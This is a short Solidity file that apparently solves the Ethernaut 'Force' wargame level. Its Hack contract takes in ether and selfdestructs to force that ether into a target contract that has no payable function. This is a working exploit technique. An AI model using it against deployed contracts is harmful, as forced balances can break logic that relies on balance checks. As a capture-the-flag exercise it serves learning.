// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
                   
contract Hack {
    

    receive()external payable  {}

    function send(address payable  _force) public payable {
selfdestruct(_force);
}}